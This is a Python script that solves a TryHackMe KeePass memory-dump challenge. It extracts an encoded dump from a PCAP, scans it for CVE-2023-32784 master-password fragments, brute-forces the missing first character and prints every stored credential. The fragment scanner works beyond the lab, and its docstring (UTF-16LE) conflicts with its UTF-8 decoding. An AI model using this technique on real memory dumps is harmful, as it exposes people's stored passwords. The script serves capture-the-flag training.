#!/usr/bin/env python3
"""
keepass_dfir.py — All-in-one KeePass credential recovery script
TryHackMe: The Magician / KeePass Memory Dump challenge

Usage:
    python3 keepass_dfir.py <capture.pcap>

What it does:
    1. Streams TCP port 1337 data from the PCAP (base64 + XOR 0x41 encoded memory dump)
    2. Decodes and decrypts the memory dump in chunks (handles 700MB+ files)
    3. Scans for CVE-2023-32784 KeePass password fragments
    4. Decodes the already-recovered kdbx (port 1338 data hardcoded from your paste)
    5. Tries all printable first-chars + the recovered suffix to open the database
    6. Prints the flag

Requirements:
    pip install scapy pykeepass

Author: DFIR analysis
"""

import sys
import os
import base64
import string
import struct
import tempfile

# ── Hardcoded recovered kdbx (from your port 1338 paste) ──────────────────────
KDBX_B64 = (
    "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"
    "bkUXW9q99M3KfGnvW5Vca+Vg=="
)

KDBX_XOR_KEY = 0x42
DUMP_XOR_KEY = 0x41
DUMP_PORT    = 1337


# ── Step 1: Recover kdbx ──────────────────────────────────────────────────────

def recover_kdbx(out_path="recovered.kdbx"):
    raw = base64.b64decode("".join(KDBX_B64.split()))
    data = bytes(b ^ KDBX_XOR_KEY for b in raw)
    sig1 = struct.unpack_from("<I", data, 0)[0]
    assert sig1 == 0x9AA2D903, "Bad KeePass signature!"
    with open(out_path, "wb") as f:
        f.write(data)
    print(f"[+] KeePass database written: {out_path} ({len(data)} bytes)")
    return out_path


# ── Step 2: Stream-extract memory dump from PCAP ──────────────────────────────

def extract_dump_from_pcap(pcap_path, out_path="recovered.dmp"):
    """
    Reads TCP payload going TO port 1337 from the PCAP in a streaming fashion,
    base64-decodes it, XORs with 0x41, writes the raw memory dump.
    Handles 700MB+ captures without loading everything into RAM.
    """
    try:
        from scapy.all import PcapReader, TCP, Raw
    except ImportError:
        print("[!] scapy not found. Install with: pip install scapy")
        sys.exit(1)

    print(f"[*] Streaming PCAP: {pcap_path}  (this may take a minute for large files)")

    b64_chunks = []
    total_payload = 0
    pkt_count = 0

    with PcapReader(pcap_path) as reader:
        for pkt in reader:
            pkt_count += 1
            if pkt_count % 50000 == 0:
                print(f"    ... {pkt_count} packets, {total_payload//1024} KB payload so far")
            if TCP in pkt and Raw in pkt and pkt[TCP].dport == DUMP_PORT:
                chunk = bytes(pkt[Raw])
                b64_chunks.append(chunk)
                total_payload += len(chunk)

    if not b64_chunks:
        print(f"[!] No data found on TCP port {DUMP_PORT}. Check the PCAP.")
        sys.exit(1)

    print(f"[+] Captured {total_payload:,} bytes of base64 data from port {DUMP_PORT}")

    b64_data = b"".join(b64_chunks)
    # Strip any whitespace/newlines the script may have added
    b64_data = b64_data.replace(b"\r", b"").replace(b"\n", b"").replace(b" ", b"")

    print("[*] Base64-decoding and XOR-decrypting...")
    decoded = base64.b64decode(b64_data)
    dump = bytes(b ^ DUMP_XOR_KEY for b in decoded)

    with open(out_path, "wb") as f:
        f.write(dump)

    print(f"[+] Memory dump written: {out_path} ({len(dump):,} bytes)")
    return out_path


# ── Step 3: Scan dump for CVE-2023-32784 password fragments ───────────────────

def scan_dump_for_password(dump_path):
    """
    CVE-2023-32784: KeePass 2.x leaks the master password in process memory as
    progressively longer UTF-16LE substrings. Each substring is preceded by a
    UTF-8 bullet character (U+25CF = 0xE2 0x97 0x8F).

    We collect all fragments, sort by length, and return the longest (= most
    complete password, missing only the first character).
    """
    print(f"\n[*] Scanning dump for CVE-2023-32784 password fragments...")

    BULLET = b"\xe2\x97\x8f"
    fragments = []

    # Stream through the dump in 64 MB windows with a small overlap
    WINDOW  = 64 * 1024 * 1024   # 64 MB
    OVERLAP = 64                  # enough to catch a split bullet

    with open(dump_path, "rb") as f:
        leftover = b""
        offset   = 0
        while True:
            chunk = f.read(WINDOW)
            if not chunk:
                break
            data = leftover + chunk
            pos = 0
            while True:
                idx = data.find(BULLET, pos)
                if idx == -1:
                    break
                # Read up to 128 bytes after the bullet as a potential fragment
                frag_raw = data[idx + 3 : idx + 3 + 128]
                # It's a null-terminated UTF-8 string
                null = frag_raw.find(b"\x00")
                if null != -1:
                    frag_raw = frag_raw[:null]
                try:
                    text = frag_raw.decode("utf-8")
                    # Only keep printable fragments of reasonable length
                    if text and all(c in string.printable for c in text) and len(text) >= 2:
                        fragments.append(text)
                except UnicodeDecodeError:
                    pass
                pos = idx + 1
            # Keep the last OVERLAP bytes for the next window
            leftover = data[-OVERLAP:]
            offset  += len(chunk)
            print(f"    ... scanned {offset//1024//1024} MB", end="\r")

    print()

    if not fragments:
        print("[!] No bullet-pattern fragments found in dump.")
        return None

    # Deduplicate and sort longest first
    unique = sorted(set(fragments), key=len, reverse=True)
    print(f"[+] Found {len(unique)} unique password fragment(s):")
    for f in unique[:15]:
        print(f"    ●{f}")

    longest = unique[0]
    print(f"\n[+] Most complete fragment (all chars except first): ●{longest}")
    print(f"[+] This is the answer to: 'What is the initial part of the password?'")
    print(f"    → {longest}")
    return longest


# ── Step 4: Brute-force the first character ───────────────────────────────────

def crack_first_char(kdbx_path, suffix):
    try:
        import pykeepass
    except ImportError:
        print("[!] pykeepass not found. Install with: pip install pykeepass")
        sys.exit(1)

    print(f"\n[*] Brute-forcing first character against kdbx (suffix = '{suffix}')...")

    # Try printable ASCII chars as the missing first character
    charset = string.printable[:95]

    for c in charset:
        password = c + suffix
        try:
            kp = pykeepass.PyKeePass(kdbx_path, password=password)
            print(f"\n[!!!] MASTER PASSWORD FOUND: {password}")
            print(f"[+] Missing character (answer to Q2): '{c}'")
            print()
            print("=" * 60)
            print("KeePass Database Contents:")
            print("=" * 60)
            for entry in kp.entries:
                print(f"  Group   : {entry.group.name if entry.group else 'root'}")
                print(f"  Title   : {entry.title}")
                print(f"  Username: {entry.username}")
                print(f"  Password: {entry.password}")
                if entry.notes:
                    print(f"  Notes   : {entry.notes}")
                if entry.url:
                    print(f"  URL     : {entry.url}")
                print()
                # Highlight the flag
                for field in [entry.title, entry.username, entry.password,
                               entry.notes, entry.url]:
                    if field and "THM{" in str(field):
                        print(f"  🚩 FLAG: {field}")
            return password
        except Exception:
            pass

    print("[!] No match found. The suffix from the memory dump may be incomplete.")
    print("    Try running keepass-dump-masterkey on the dump for a cleaner result.")
    return None


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(0)

    pcap_path = sys.argv[1]
    if not os.path.exists(pcap_path):
        print(f"[!] File not found: {pcap_path}")
        sys.exit(1)

    print("=" * 60)
    print("  KeePass DFIR Recovery — CVE-2023-32784")
    print("=" * 60)

    # Step 1: Recover the kdbx we already have
    kdbx_path = recover_kdbx("recovered.kdbx")

    # Step 2: Extract and decrypt the memory dump from the PCAP
    dump_path = extract_dump_from_pcap(pcap_path, "recovered.dmp")

    # Step 3: Scan dump for password fragments
    suffix = scan_dump_for_password(dump_path)

    if suffix:
        # Step 4: Crack the first char
        crack_first_char(kdbx_path, suffix)
    else:
        print("\n[!] Could not extract password suffix from dump.")
        print("    Try: keepass-dump-masterkey recovered.dmp")


if __name__ == "__main__":
    main()
